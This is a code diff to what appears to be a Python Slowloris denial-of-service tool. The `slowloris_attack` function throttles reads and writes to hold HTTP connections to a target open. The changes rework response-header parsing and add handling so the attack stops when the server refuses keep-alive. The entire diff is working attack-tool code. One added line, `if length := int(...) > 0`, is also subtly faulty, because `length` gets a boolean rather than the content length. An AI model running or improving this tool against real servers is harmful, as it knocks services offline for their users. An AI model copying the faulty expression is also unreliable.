@@ -185,7 +185,7 @@ async def slowloris_attack(host, port, read_rate, write_rate, https, path, heade
 
     for h in headers_list:
         data = h.split(':')
-        headers[data[0].strip()] = (':'.join(data[1:])).strip()
+        headers[data[0].strip()] = ':'.join(data[1:]).strip()
 
     headers['Connection'] = 'keep-alive'
 
@@ -217,25 +217,31 @@ async def slowloris_attack(host, port, read_rate, write_rate, https, path, heade
 
         time_read_start = time.time()
 
-        response_headers = await slowloris_readuntil(reader, b'\r\n\r\n', read_rate)
-        if len(response_headers) == 0:
+        raw_response_headers = await slowloris_readuntil(reader, b'\r\n\r\n', read_rate)
+        raw_response_headers = raw_response_headers.strip().split(b'\r\n')
+
+        response_headers = {}
+
+        if len(raw_response_headers) <= 1:
             writer.close()
             raise Exception('Could not get response headers')
 
-        status_text = b"?"
-        response_headers = response_headers.strip().split(b'\r\n')
-        if len(response_headers) > 1:
-            status_text = response_headers[0].split()[-1].strip()
-        status_text = status_text.decode()
-        length = 0
-        for rh in response_headers:
-            if rh.lower().strip().startswith(b'content-length'):
-                length = int(rh.split(b':')[-1].strip())
+        for h in raw_response_headers[1:]:
+            data = h.split(b':')
+            response_headers[data[0].strip().lower()] = b':'.join(data[1:]).strip()
 
-        if length > 0:
+        status_text = raw_response_headers[0].decode()
+
+        if length := int(response_headers.get(b'content-length', 0)) > 0:
             await slowloris_read(reader, read_rate, n=length)
 
         print(f'Got http response {status_text} in {time.time()-time_read_start} seconds')
+
+        if response_headers.get(b'connection', b'').lower() == b'close':
+            print('Unable to keep-alive, got "Connection: close" in response headers')
+            writer.close()
+            await asyncio.sleep(args.interval)
+            return
 
         await asyncio.sleep(args.interval)
 
